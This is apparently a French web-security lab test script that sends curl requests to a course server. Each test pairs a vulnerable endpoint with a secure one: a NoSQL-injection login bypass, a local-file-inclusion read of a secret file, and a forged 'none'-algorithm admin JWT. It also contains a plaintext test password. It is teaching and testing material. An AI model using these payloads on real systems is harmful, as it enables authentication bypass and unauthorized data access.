#!/bin/bash
# Suite de tests complète

API_URL="https://tp-securite-khelifa.francecentral.cloudapp.azure.com"

echo "🔥 TP Sécurité Web - Tests Automatisés"
echo "======================================"

# Créer utilisateur de test
echo "📝 Création utilisateur de test..."
curl -s -X POST "$API_URL/create-user" > /dev/null

# Test 1: NoSQL Injection
echo -e "\n🗃️ Test NoSQL Injection"
echo "----------------------"

echo "Bypass complet..."
NOSQL_RESULT=$(curl -s -X POST "$API_URL/vulnerable/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}')

if echo "$NOSQL_RESULT" | grep -q '"success":true'; then
    echo "✅ NoSQL Injection réussie"
    echo "   $(echo "$NOSQL_RESULT" | jq -r '.user.username // "N/A"')"
else
    echo "❌ NoSQL Injection échouée"
fi

echo "Test protection..."
SECURE_NOSQL=$(curl -s -X POST "$API_URL/secure/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}')

if echo "$SECURE_NOSQL" | grep -q '"success":false'; then
    echo "✅ Protection NoSQL effective"
else
    echo "❌ Protection NoSQL échouée"
fi

# Test 2: LFI
echo -e "\n📁 Test Local File Inclusion"
echo "----------------------------"

echo "Lecture fichier secret..."
LFI_RESULT=$(curl -s "$API_URL/vulnerable/file?file=secret.txt")

if echo "$LFI_RESULT" | grep -q '"success":true'; then
    echo "✅ LFI réussie"
    echo "   $(echo "$LFI_RESULT" | jq -r '.content' | head -1)"
else
    echo "❌ LFI échouée"
fi

echo "Test protection..."
SECURE_LFI=$(curl -s "$API_URL/secure/file?file=secret.txt")

if echo "$SECURE_LFI" | grep -q '"success":false'; then
    echo "✅ Protection LFI effective"
else
    echo "❌ Protection LFI échouée"
fi

# Test 3: JWT
echo -e "\n🔑 Test JWT Vulnerabilities"
echo "---------------------------"

echo "Génération token vulnérable..."
JWT_RESULT=$(curl -s -X POST "$API_URL/vulnerable/jwt-login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"secret123"}')

if echo "$JWT_RESULT" | grep -q '"success":true'; then
    echo "✅ Token obtenu"
else
    echo "❌ Erreur génération token"
fi

echo "Test algorithme 'none'..."
NONE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."

JWT_NONE=$(curl -s -X POST "$API_URL/vulnerable/jwt-verify" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$NONE_TOKEN\"}")

if echo "$JWT_NONE" | grep -q '"success":true'; then
    echo "✅ Token 'none' accepté (vulnérabilité confirmée)"
else
    echo "❌ Token 'none' rejeté"
fi

echo "Test protection JWT..."
SECURE_JWT=$(curl -s -X POST "$API_URL/secure/jwt-verify" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$NONE_TOKEN\"}")

if echo "$SECURE_JWT" | grep -q '"success":false'; then
    echo "✅ Protection JWT effective"
else
    echo "❌ Protection JWT échouée"
fi

echo -e "\n🎯 Tests terminés"
echo "📚 Documentation complète: $API_URL/api"
